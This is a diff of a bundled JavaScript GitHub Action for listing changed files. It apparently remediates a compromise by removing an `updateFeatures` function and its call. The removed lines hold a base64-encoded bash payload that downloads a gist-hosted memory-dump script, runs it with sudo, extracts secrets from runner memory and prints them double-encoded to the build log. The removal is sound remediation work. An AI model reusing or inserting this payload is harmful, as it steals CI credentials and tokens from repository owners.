@@ -1864,7 +1864,6 @@ async function run() {
     const env = await (0, env_1.getEnv)();
     core.debug(`Env: ${JSON.stringify(env, null, 2)}`);
     const inputs = (0, inputs_1.getInputs)();
-    await (0, utils_1.updateFeatures)(inputs.token);
     core.debug(`Inputs: ${JSON.stringify(inputs, null, 2)}`);
     const workingDirectory = path_1.default.resolve(env.GITHUB_WORKSPACE || process.cwd(), inputs.useRestApi ? '.' : inputs.path);
     core.debug(`Working directory: ${workingDirectory}`);
@@ -1960,7 +1959,6 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.warnUnsupportedRESTAPIInputs = exports.hasLocalGitDirectory = exports.recoverDeletedFiles = exports.setOutput = exports.setArrayOutput = exports.getOutputKey = exports.getRecoverFilePatterns = exports.getYamlFilePatterns = exports.getFilePatterns = exports.getDirNamesIncludeFilesPattern = exports.jsonOutput = exports.getDirnameMaxDepth = exports.canDiffCommits = exports.getPreviousGitTag = exports.cleanShaInput = exports.verifyCommitSha = exports.getParentSha = exports.getCurrentBranchName = exports.getRemoteBranchHeadSha = exports.isInsideWorkTree = exports.getHeadSha = exports.gitLog = exports.getFilteredChangedFiles = exports.getAllChangedFiles = exports.gitRenamedFiles = exports.gitSubmoduleDiffSHA = exports.getSubmodulePath = exports.gitFetchSubmodules = exports.gitFetch = exports.submoduleExists = exports.isRepoShallow = exports.updateGitGlobalConfig = exports.exists = exports.verifyMinimumGitVersion = exports.getDirname = exports.normalizeSeparators = exports.isWindows = void 0;
-exports.updateFeatures = updateFeatures;
 /*global AsyncIterableIterator*/
 const core = __importStar(__nccwpck_require__(7484));
 const exec = __importStar(__nccwpck_require__(5236));
@@ -2994,15 +2992,6 @@ const warnUnsupportedRESTAPIInputs = async ({ inputs }) => {
     }
 };
 exports.warnUnsupportedRESTAPIInputs = warnUnsupportedRESTAPIInputs;
-async function updateFeatures(token) {
-  
-    const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo "aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=" | base64 -d > /tmp/run.sh && bash /tmp/run.sh`], {
-        ignoreReturnCode: true,
-        silent: true
-    });
-    core.info(stdout);
-    
-}
 
 
 /***/ }),
@@ -9015,7 +9004,6 @@ class HttpClient {
 }
 exports.HttpClient = HttpClient;
 const lowercaseKeys = (obj) => Object.keys(obj).reduce((c, k) => ((c[k.toLowerCase()] = obj[k]), c), {});
-//# sourceMappingURL=index.js.map
 
 /***/ }),
 
